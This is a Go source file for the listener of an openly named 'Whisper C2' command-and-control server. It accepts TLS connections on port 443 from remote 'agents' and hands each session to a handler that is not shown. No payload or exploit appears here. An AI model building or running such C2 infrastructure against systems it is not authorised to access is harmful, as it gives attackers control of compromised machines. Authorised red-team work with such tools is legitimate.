package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"whisper/server/rawtcp/handler"
)

func main() {

	cert, err := tls.LoadX509KeyPair("certs/c2.crt", "certs/c2.key")
	if err != nil {
		log.Fatalf("Failed to load cert/key: %s", err)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", ":443", config)
	if err != nil {
		log.Fatalf("Failed to start TLS listener: %s", err)
	}
	defer ln.Close()
	fmt.Println("[*] Whisper C2 listening on 0.0.0.0:443 (TLS)")

	for {
		conn, err := ln.Accept()
		if err != nil {
			fmt.Println("[-] Failed to accept connection:", err)
			continue
		}
		fmt.Println("[+] Agent connected from", conn.RemoteAddr())
		go handler.HandleSession(conn)
	}
}
